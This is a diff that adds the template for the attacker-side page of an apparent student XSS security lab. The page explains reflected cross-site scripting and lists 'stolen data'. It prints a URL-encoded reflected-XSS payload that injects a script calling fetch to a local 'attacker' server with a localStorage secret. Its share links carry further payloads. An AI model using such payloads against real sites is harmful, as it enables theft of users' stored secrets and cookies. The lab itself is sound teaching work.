@@ -1,0 +1,108 @@
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css">
+    <title>Malicious Site</title>
+</head>
+
+<body>
+    <section class="hero is-dark has-text-centered">
+        <div class="hero-body">
+            <p class="title">
+                Software Security Project
+            </p>
+            <p class="subtitle">
+                Joshua Morrell
+            </p>
+        </div>
+    </section>
+    <section class="section">
+        <h1 class="is-size-4">Stolen Data</h1><br>
+        <div class="table-container">
+            <table class="table is-striped is-fullwidth is-bordered">
+                <thead>
+                    <tr>
+                        <th>Position</th>
+                        <th>Data</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <% data.forEach((d, i)=> {%>
+                        <tr>
+                            <td>
+                                <%= i+1 %>
+                            </td>
+                            <td>
+                                <%= d %>
+                            </td>
+                        </tr>
+                        <% }); %>
+                </tbody>
+            </table>
+        </div>
+    </section>
+    <hr>
+    <section class="section">
+        <h1 class="is-size-4">Reflected XSS Example</h1><br>
+        <div class="columns">
+            <div class="column is-half">
+                <p>A reflected cross site scripting attack occurs when an attacker creates a request that hijacks a
+                    users browser and sends a request to a trusted website on the users behalf. This is often done in the form
+                    of an embedded link in an email or a forum, where the link contains an executable script. When the
+                    user clicks on the link the script executes on their behalf, making a request to a trusted site and
+                    sending the results back to the attacker.</p>
+                <br>
+                <p>Here on the right is an example of something you might see when browsing a blog or social media site, or perhaps embedded in an email. And somehow... you are tricked into clicking on one of the share buttons because you just couldn't resist posting the hilarious quote.</p>
+                <br>
+                <p>Little did you know that the link is malicious. Lets take a look at what clicking on the Facebook link does.</p>
+                <br>
+                <pre>http://localhost:3000/?comment=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A3001%2F%3Fdata%3D%24%7BlocalStorage.getItem%28%22secret%22%29%7D%60%29%3C%2Fscript%3E%0D%0A</pre>
+                <br>
+                <p>Similar to what we saw with a Stored XSS attack, the link sends a new comment request on behalf of the user to the vulnerable website. The script contained in the query payload is asking for the vulnerable site to send the attacker a sensitive item stored in the users local storage.</p>
+                <br>
+                <p>If you have clicked on the link, you should be able to refresh this site and see the secret value that was stored in the users browser. Now see if you can figure out what the Twitter link does. One thing to keep in mind is that often an attacker will obfuscate these links by using a url shortener, making it much harder to visually inspect a link for possible scripts.</p>
+                <br>
+                <p>Head back to <a href="http://localhost:3000">the vulnerable site</a> for a look at preventing these types of attacks.</p>
+            </div>
+            <div class="column is-half" style="border-left: thin solid #363636;">
+                <div class="columns is-centered">
+                    <div class="column is-half">
+                        <div class="card">
+                            <div class="card-content">
+                                <p class="is-size-3">
+                                    I changed all of my passwords to "incorrect".<br>So whenever I forget, it will
+                                    tell me "Your password is incorrect!"
+                                </p>
+                                <br>
+                                <p class="is-size-5 level-right has-text-weight-light">
+                                    - Somebody Somewhere
+                                </p>
+                            </div>
+                            <footer class="card-footer">
+                                <p class="card-footer-item">
+                                    <span>
+                                        View on
+                                        <% if (cookie_link) {%>
+                                            <a target="_blank" href="<%= cookie_link %>">Twitter</a>
+                                            <% } %>
+                                    </span>
+                                </p>
+                                <p class="card-footer-item">
+                                    <span>
+                                        Share on
+                                        <% if (storage_link) {%>
+                                            <a target="_blank" href="<%= storage_link %>">Facebook</a>
+                                            <% } %>
+                                    </span>
+                                </p>
+                            </footer>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+</body>
+
+</html>
